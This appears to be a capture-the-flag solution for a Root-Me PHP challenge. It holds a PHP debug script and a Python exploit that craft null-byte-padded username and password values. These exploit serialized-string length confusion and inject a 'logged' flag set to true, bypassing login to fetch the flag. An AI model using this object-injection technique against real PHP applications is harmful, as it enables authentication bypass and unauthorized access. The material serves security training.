Idea: https://blog.hacktivesecurity.com/index.php/2019/10/03/rusty-joomla-rce/

Debug file:

```php
<?php 
  
class User
{
    protected $_username;
    protected $_password;
    protected $_logged = false;
    protected $_email = '';

    public function __construct($username, $password)
    {
        $this->_username = $username;
        $this->_password = $password;
        $this->_logged = false;
    }

    public function setLogged($logged)
    {
        $this->_logged = $logged;
    }

    public function isLogged()
    {
        return $this->_logged;
    }

    public function getUsername()
    {
        return $this->_username;
    }

    public function getPassword()
    {
        return $this->_password;
    }
}

  // Overflow: username truncated -> overflow the password, user password to overwrite logged then use email to wrap the rest

  //$serialize_data = 'O:4:"User":4:{s:12:"'.chr(0).'*'.chr(0).'_username";s:5:"guest";s:12:"'.chr(0).'*'.chr(0).'_password";s:5:"guest";s:10:"'.chr(0).'*'.chr(0).'_logged";b:1;s:9:"'.chr(0).'*'.chr(0).'_email";s:43:"s:10:"'.chr(0).'*'.chr(0).'_logged";b:0;s:9:"'.chr(0).'*'.chr(0).'_email";s:0:"";}';
  //$serialize_data = 'O:4:"User":4:{s:12:"'.chr(0).'*'.chr(0).'_username";s:60:"\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";s:12:"\0\0\0_password";s:87:"gu";s:12:"\0\0\0_password";s:3:"gue";s:10:"\0\0\0_logged";b:1;s:9:"\0\0\0_email";s:43:"s:10:"'.chr(0).'*'.chr(0).'_logged";b:0;s:9:"'.chr(0).'*'.chr(0).'_email";s:0:"";}';
  $username = '\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0';
  $password = 'gu";s:12:"\0\0\0_password";s:3:"gue";s:10:"\0\0\0_logged";b:1;s:9:"\0\0\0_email";s:45:"';   
  $user = new User($username, $password);
  $serialized_value = (serialize($user));
  $data = str_replace(chr(0) . '*' . chr(0), '\0\0\0', $serialized_value);
  $unserialize = str_replace('\0\0\0', chr(0) . '*' . chr(0), $data);
  var_dump($unserialize);
  var_dump(unserialize($unserialize));
  //$serialized_user = str_replace('\0\0\0', chr(0) . '*' . chr(0), $serialize_data);
  //$user = unserialize($serialized_user);
  //var_dump($user);
?>

```

Exploit file:

```python
from tokenize import cookie_re
import requests


url = 'http://challenge01.root-me.org/web-serveur/ch65/'
cookies = {
  'PHPSESSID': 'd4274216d3338c272046f3edac55e9fe'
}

data = {
  'username': r'\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0',
  'password': r'gu";s:12:"\0\0\0_password";s:3:"gue";s:10:"\0\0\0_logged";b:1;s:9:"\0\0\0_email";s:45:"',
  'submit': 'login'
}

requests.post(url, cookies=cookies, data=data) # storeUserSession
print(requests.get(url, cookies=cookies).text) # getUserSession and retrieve flag
```
